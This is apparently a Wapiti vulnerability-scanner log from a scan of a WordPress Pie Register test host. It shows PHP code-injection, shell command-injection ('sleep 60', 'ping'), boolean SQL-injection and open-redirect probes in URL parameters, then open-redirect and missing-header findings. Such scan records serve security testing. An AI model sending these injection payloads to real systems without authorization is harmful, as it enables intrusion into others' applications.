2024-03-21 13:05:16.563 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 13:05:17.119 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-21 13:05:17.681 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 13:05:18.243 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-21 13:05:18.812 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 13:05:19.373 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-21 13:05:19.930 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 13:05:20.498 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-21 13:05:21.077 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 13:05:21.636 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-21 13:05:22.194 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D (0)
2024-03-21 13:05:22.750 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=a%60%29%60 (0)
2024-03-21 13:05:23.312 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=a%60sleep%2060%60 (0)
2024-03-21 13:05:23.873 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=a%3Bsleep%2060%3B (0)
2024-03-21 13:05:24.426 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=a%7Csleep%2060%3B (0)
2024-03-21 13:05:24.984 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=%26ping%20-n%2025%20127.0.0.1%26 (0)
2024-03-21 13:05:25.580 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
2024-03-21 13:05:25.596 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?redirect_to=fuzz&piereg_logout_url=true (0)
2024-03-21 13:05:25.597 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/?redirect_to=fuzz%C2%BF%27%22%28&piereg_logout_url=true (0)
2024-03-21 13:05:26.148 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=fuzz%C2%BF%27%22%28 (0)
2024-03-21 13:05:27.281 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz%20AND%2081%3D113%20AND%2086%3D86&piereg_logout_url=true (0)
2024-03-21 13:05:27.890 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz%20AND%2073%3D105%20AND%2036%3D36&piereg_logout_url=true (0)
2024-03-21 13:05:28.456 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz%20AND%2018%3D18%20AND%2046%3D46&piereg_logout_url=true (0)
2024-03-21 13:05:29.023 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz%27%20AND%2065%3D115%20AND%20%2790%27%3D%2790&piereg_logout_url=true (0)
2024-03-21 13:05:29.581 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz%27%20AND%2054%3D74%20AND%20%2750%27%3D%2750&piereg_logout_url=true (0)
2024-03-21 13:05:30.137 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz%27%20AND%2034%3D34%20AND%20%2780%27%3D%2780&piereg_logout_url=true (0)
2024-03-21 13:05:30.700 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz%22%20AND%2020%3D52%20AND%20%2260%22%3D%2260&piereg_logout_url=true (0)
2024-03-21 13:05:31.259 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz%22%20AND%2068%3D94%20AND%20%2218%22%3D%2218&piereg_logout_url=true (0)
2024-03-21 13:05:31.827 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz%22%20AND%2017%3D17%20AND%20%2233%22%3D%2233&piereg_logout_url=true (0)
2024-03-21 13:05:32.392 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz%29%20AND%2096%3D172%20AND%20%2866%3D66&piereg_logout_url=true (0)
2024-03-21 13:05:32.960 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz%29%20AND%2016%3D100%20AND%20%2899%3D99&piereg_logout_url=true (0)
2024-03-21 13:05:33.520 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz%29%20AND%2089%3D89%20AND%20%2852%3D52&piereg_logout_url=true (0)
2024-03-21 13:05:34.083 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz%27%29%20AND%2026%3D72%20AND%20%28%2781%27%3D%2781&piereg_logout_url=true (0)
2024-03-21 13:05:34.641 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz%27%29%20AND%2047%3D100%20AND%20%28%2783%27%3D%2783&piereg_logout_url=true (0)
2024-03-21 13:05:35.208 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz%27%29%20AND%2076%3D76%20AND%20%28%2722%27%3D%2722&piereg_logout_url=true (0)
2024-03-21 13:05:35.769 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz%22%29%20AND%2016%3D88%20AND%20%28%2225%22%3D%2225&piereg_logout_url=true (0)
2024-03-21 13:05:36.327 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz%22%29%20AND%2035%3D69%20AND%20%28%2231%22%3D%2231&piereg_logout_url=true (0)
2024-03-21 13:05:36.879 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz%22%29%20AND%2063%3D63%20AND%20%28%2229%22%3D%2229&piereg_logout_url=true (0)
2024-03-21 13:05:37.436 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%20AND%2015%3D40%20AND%2083%3D83 (0)
2024-03-21 13:05:38.000 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%20AND%2040%3D113%20AND%2030%3D30 (0)
2024-03-21 13:05:38.561 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%20AND%2039%3D39%20AND%2057%3D57 (0)
2024-03-21 13:05:39.124 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%27%20AND%2019%3D69%20AND%20%2766%27%3D%2766 (0)
2024-03-21 13:05:39.736 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%27%20AND%2096%3D178%20AND%20%2746%27%3D%2746 (0)
2024-03-21 13:05:40.298 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%27%20AND%2056%3D56%20AND%20%2711%27%3D%2711 (0)
2024-03-21 13:05:40.845 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%22%20AND%2045%3D137%20AND%20%2211%22%3D%2211 (0)
2024-03-21 13:05:41.426 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%22%20AND%2089%3D118%20AND%20%2252%22%3D%2252 (0)
2024-03-21 13:05:41.996 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%22%20AND%2062%3D62%20AND%20%2284%22%3D%2284 (0)
2024-03-21 13:05:42.569 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%29%20AND%2060%3D134%20AND%20%2814%3D14 (0)
2024-03-21 13:05:43.133 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%29%20AND%2081%3D136%20AND%20%2869%3D69 (0)
2024-03-21 13:05:43.699 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%29%20AND%2014%3D14%20AND%20%2818%3D18 (0)
2024-03-21 13:05:44.260 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%27%29%20AND%2040%3D91%20AND%20%28%2751%27%3D%2751 (0)
2024-03-21 13:05:44.824 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%27%29%20AND%2010%3D84%20AND%20%28%2741%27%3D%2741 (0)
2024-03-21 13:05:45.388 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%27%29%20AND%2023%3D23%20AND%20%28%2738%27%3D%2738 (0)
2024-03-21 13:05:45.949 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%22%29%20AND%2071%3D120%20AND%20%28%2248%22%3D%2248 (0)
2024-03-21 13:05:46.509 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%22%29%20AND%2034%3D65%20AND%20%28%2294%22%3D%2294 (0)
2024-03-21 13:05:47.065 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%22%29%20AND%2054%3D54%20AND%20%28%2236%22%3D%2236 (0)
2024-03-21 13:05:47.641 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
2024-03-21 13:05:47.664 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?redirect_to=fuzz&piereg_logout_url=true (0)
2024-03-21 13:05:47.681 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
2024-03-21 13:05:47.698 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?redirect_to=fuzz&piereg_logout_url=true (0)
2024-03-21 13:05:48.274 | WARNING  | wapitiCore.controller.wapiti:attack:539 - 1 requests were skipped due to network issues
2024-03-21 13:05:48.275 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
2024-03-21 13:05:48.291 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?redirect_to=fuzz&piereg_logout_url=true (0)
2024-03-21 13:05:48.292 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/?redirect_to=https%3A%2F%2Fopenbugbounty.org%2F&piereg_logout_url=true
2024-03-21 13:05:48.920 | RED      | wapitiCore.attack.mod_redirect:attack:79 - ---
2024-03-21 13:05:48.920 | RED      | wapitiCore.attack.mod_redirect:attack:80 - Open Redirect in http://web/ via injection in the query string
2024-03-21 13:05:48.921 | RED      | wapitiCore.attack.mod_redirect:attack:86 - Evil request:
2024-03-21 13:05:48.921 | RED      | wapitiCore.attack.mod_redirect:attack:87 -     GET /?redirect_to=https%3A%2F%2Fopenbugbounty.org%2F&piereg_logout_url=true HTTP/1.1
    host: web
    connection: keep-alive
    user-agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
    accept-language: en-US,en;q=0.5
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    sec-fetch-user: ?1
    sec-fetch-site: none
    sec-fetch-mode: navigate
    sec-fetch-dest: document
    upgrade-insecure-requests: 1
    dnt: 1
2024-03-21 13:05:48.921 | RED      | wapitiCore.attack.mod_redirect:attack:88 - ---
2024-03-21 13:05:48.922 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/?redirect_to=%2F%2Fopenbugbounty.org%2F&piereg_logout_url=true
2024-03-21 13:05:49.539 | RED      | wapitiCore.attack.mod_redirect:attack:79 - ---
2024-03-21 13:05:49.539 | RED      | wapitiCore.attack.mod_redirect:attack:80 - Open Redirect in http://web/ via injection in the query string
2024-03-21 13:05:49.539 | RED      | wapitiCore.attack.mod_redirect:attack:86 - Evil request:
2024-03-21 13:05:49.540 | RED      | wapitiCore.attack.mod_redirect:attack:87 -     GET /?redirect_to=%2F%2Fopenbugbounty.org%2F&piereg_logout_url=true HTTP/1.1
    host: web
    connection: keep-alive
    user-agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
    accept-language: en-US,en;q=0.5
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    sec-fetch-user: ?1
    sec-fetch-site: none
    sec-fetch-mode: navigate
    sec-fetch-dest: document
    upgrade-insecure-requests: 1
    dnt: 1
2024-03-21 13:05:49.540 | RED      | wapitiCore.attack.mod_redirect:attack:88 - ---
2024-03-21 13:05:49.540 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/?redirect_to=fuzz&piereg_logout_url=https%3A%2F%2Fopenbugbounty.org%2F
2024-03-21 13:05:50.120 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/?redirect_to=fuzz&piereg_logout_url=%2F%2Fopenbugbounty.org%2F
2024-03-21 13:05:50.697 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
2024-03-21 13:05:50.713 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?redirect_to=fuzz&piereg_logout_url=true (0)
2024-03-21 13:05:51.853 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
2024-03-21 13:05:51.869 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?redirect_to=fuzz&piereg_logout_url=true (0)
2024-03-21 13:05:52.419 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
2024-03-21 13:05:52.419 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Frame-Options is not set
2024-03-21 13:05:52.491 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
2024-03-21 13:05:52.492 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Content-Type-Options is not set
2024-03-21 13:05:52.577 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module permanentxss
2024-03-21 13:05:52.680 | GREEN    | wapitiCore.controller.wapiti:write_report:601 - [*] Generating report...
2024-03-21 13:05:52.726 | SUCCESS  | wapitiCore.controller.wapiti:write_report:603 - A report has been generated in the file ./data/output//pie-register.json/
2024-03-21 13:05:52.726 | SUCCESS  | wapitiCore.controller.wapiti:write_report:605 - Open ./data/output//pie-register.json/web_03212024_1303.html with a browser to see this report.
